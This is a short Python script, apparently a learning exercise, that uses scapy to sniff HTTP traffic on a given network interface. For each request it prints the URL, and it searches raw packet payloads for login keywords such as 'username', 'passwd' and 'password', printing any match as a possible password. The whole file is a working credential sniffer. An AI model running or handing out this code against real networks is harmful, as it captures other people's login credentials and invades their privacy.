import scapy.all as scapy
from scapy.layers import http
# import sys
import optparse

parser=optparse.OptionParser()
parser.add_option("-i","--interface",dest="interface",help="enter the interface to be sniffed")
options=parser.parse_args()[0]


def get_url(packet):
        if packet[http.HTTPRequest].Host and packet[http.HTTPRequest].Path:
            url=packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path#we can get the host name and website path
            return url#retruns a byte object


def get_login_info(packet):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            # load = str(packet[scapy.Raw].load)#converts the byte object which is gonna return into string object
            # print(load)
            keywords = ["username", "user", "loginid", "login", "passwd", "password", "uname", "pass"]
            for keyword in keywords:
                if keyword in str(load):
                    return load#returns a byte object


def processed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP REQUEST: " + str(url))

        login_info = get_login_info(packet)
        if login_info:
            print(
                "\n\n[+] POSSIBLE PASSWORD: " + login_info.decode() + "\n\n")  # Another way of converting the byte object into string




def sniffer(interface):
    # scapy.sniff(iface=interface,store=False,prn=processed_packet,filter="port 21"or "TCP")can be used for filter other than http
    scapy.sniff(iface=interface,store=False,prn=processed_packet)#prn is a call back function which is used for doing some processing on each packet

sniffer(options.interface)
